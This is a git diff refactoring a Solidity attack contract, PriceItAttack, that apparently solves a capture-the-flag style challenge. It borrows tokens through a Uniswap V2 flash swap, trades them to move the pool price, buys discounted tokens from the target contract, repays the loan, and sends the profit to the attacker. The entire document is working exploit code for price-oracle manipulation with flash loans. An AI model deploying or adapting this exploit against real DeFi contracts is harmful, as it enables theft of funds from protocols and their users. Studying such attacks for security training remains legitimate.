@@ -14,7 +14,6 @@ contract PriceItAttack {
   IERC20 private token2;
   IUniswapV2Pair private token0Token2Pair;
   PriceIt private instance;
-  uint256 private flashSwapAmount = 50000 ether;
   address private attacker;
 
   function doYourThing(PriceIt _instance) external {
@@ -24,7 +23,8 @@ contract PriceItAttack {
     token1 = instance.token1();
     token2 = instance.token2();
     token0Token2Pair = IUniswapV2Pair(uniFactory.getPair(address(token0), address(token2)));
-    bytes memory data = abi.encode(token0, flashSwapAmount);
+    bytes memory data = abi.encode(token0);
+    uint256 flashSwapAmount = 50000 ether;
     if (address(token0) < address(token2)) {
       IUniswapV2Pair(token0Token2Pair).swap(flashSwapAmount, 0, address(this), data);
     } else {
@@ -34,16 +34,16 @@ contract PriceItAttack {
 
   function uniswapV2Call(
     address,
-    uint256,
-    uint256,
+    uint256 amount0Out,
+    uint256 amount1Out,
     bytes calldata
   ) external {
+    uint256 flashSwapAmount = amount0Out > 0 ? amount0Out : amount1Out;
     token0.approve(address(uniRouter), flashSwapAmount);
-    swapTwoTokens(token0, token1, flashSwapAmount);
-    uint256 token1Balance = IERC20(token1).balanceOf(address(this));
-    token1.approve(address(instance), token1Balance);
-    instance.buyToken(token1Balance / 2, token1);
-    instance.buyToken(token1Balance / 2, token1);
+    uint256 token1Output = swapTwoTokens(token0, token1, flashSwapAmount);
+    token1.approve(address(instance), token1Output);
+    instance.buyToken(token1Output / 2, token1);
+    instance.buyToken(token1Output / 2, token1);
     returnFlashSwap(address(token0), address(token0Token2Pair), flashSwapAmount);
     token0.transfer(attacker, token0.balanceOf(address(this)));
   }
@@ -52,12 +52,13 @@ contract PriceItAttack {
     IERC20 from,
     IERC20 to,
     uint256 inputAmount
-  ) private {
+  ) private returns (uint256 outputAmount) {
     address[] memory path = new address[](2);
     path[0] = address(from);
     path[1] = address(to);
     from.approve(address(uniRouter), inputAmount);
-    uniRouter.swapExactTokensForTokens(inputAmount, 0, path, address(this), block.timestamp);
+    uint256[] memory outputs = uniRouter.swapExactTokensForTokens(inputAmount, 0, path, address(this), block.timestamp);
+    return outputs[1];
   }
 
   function returnFlashSwap(
